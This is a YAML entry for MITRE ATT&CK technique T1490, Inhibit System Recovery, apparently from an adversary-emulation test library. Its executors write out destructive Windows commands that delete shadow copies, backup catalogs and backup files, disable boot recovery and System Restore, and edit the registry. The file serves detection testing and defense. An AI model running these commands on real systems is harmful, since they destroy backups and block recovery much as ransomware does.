- id: T1490
  name: Inhibit System Recovery
  description: |-
    Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.[1](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)[2](https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html) This may deny access to available backups and recovery options.

    Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).[1](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)[2](https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html) Furthermore, adversaries may disable recovery notifications, then corrupt backups.[3](https://x.com/TheDFIRReport/status/1498657590259109894)

    A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:

    * <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>
    * [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>
    * <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>
    * <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>
    * <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system
    * <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> [4](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) [5](https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware)

    On network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.

    On ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486), preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).[6](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)

    Adversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.[7](https://www.zdnet.com/article/ransomware-victims-thought-their-backups-were-safe-they-were-wrong/) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.[8](https://www.darkreading.com/attacks-breaches/code-hosting-service-shuts-down-after-cyber-attack)[9](https://rhinosecuritylabs.com/aws/s3-ransomware-part-2-prevention-and-defense/)
  tactic: impact
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Windows - Delete Volume Shadow Copies
      type: cmd
      platform: windows
      command: vssadmin.exe delete shadows /all /quiet
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows - Delete Volume Shadow Copies via WMI
      type: cmd
      platform: windows
      command: wmic.exe shadowcopy delete
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows - wbadmin Delete Windows Backup Catalog
      type: cmd
      platform: windows
      command: wbadmin delete catalog -quiet
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows - Disable Windows Recovery Console Repair
      type: cmd
      platform: windows
      command: |-
        bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
        bcdedit.exe /set {default} recoveryenabled no
      cleanup: |-
        bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
        bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
      type: powershell
      platform: windows
      command: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows - Delete Backup Files
      type: cmd
      platform: windows
      command: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows - wbadmin Delete systemstatebackup
      type: cmd
      platform: windows
      command: wbadmin delete systemstatebackup -keepVersions:0
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows - Disable the SR scheduled task
      type: cmd
      platform: windows
      command: schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable
      cleanup: schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /enable >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Disable System Restore Through Registry
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
